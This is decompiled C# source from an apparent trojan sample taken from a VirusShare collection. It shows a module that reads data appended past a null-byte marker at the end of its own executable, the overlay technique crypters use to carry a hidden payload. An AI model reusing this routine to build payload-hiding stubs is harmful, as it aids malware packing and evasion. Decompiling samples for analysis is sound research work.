// Decompiled with JetBrains decompiler
// Type: Refx.modEOF
// Assembly: Refx, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5DD4C44F-C748-4813-B398-D3DE520CF41A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.Win32.Fsysna.bezr-e553a7902dd2b2c973a97028cc8dc7f1bb82c18b1266abf90d2140ec0b5b3a01.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace Refx
{
  [StandardModule]
  internal sealed class modEOF
  {
    public static string SELF_EXE = Assembly.GetExecutingAssembly().Location;

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static string ReadEOFData(ref string FilePath)
    {
      string Left;
      try
      {
        int FileNumber = FileSystem.FreeFile();
        FileSystem.FileOpen(FileNumber, FilePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
        string Expression = Strings.Space(checked ((int) FileSystem.LOF(FileNumber)));
        FileSystem.FileGet(FileNumber, ref Expression);
        FileSystem.FileClose(FileNumber);
        string String1 = Strings.StrReverse(Expression);
        object lNum = (object) 30;
        string nullBytes = modEOF.GetNullBytes(ref lNum);
        int num = Strings.InStr(1, String1, nullBytes);
        Left = Strings.StrReverse(Strings.Mid(Strings.StrReverse(Expression), 1, checked (num - 1)));
        if (Operators.CompareString(Left, "", false) != 0)
          ;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ex.Message);
        Left = (string) null;
        ProjectData.ClearProjectError();
      }
      return Left;
    }

    public static string GetNullBytes(ref object lNum)
    {
      string nullBytes = "";
      short num1 = Conversions.ToShort(lNum);
      short num2 = 1;
      while ((int) num2 <= (int) num1)
      {
        nullBytes += "\0";
        checked { ++num2; }
      }
      return nullBytes;
    }
  }
}
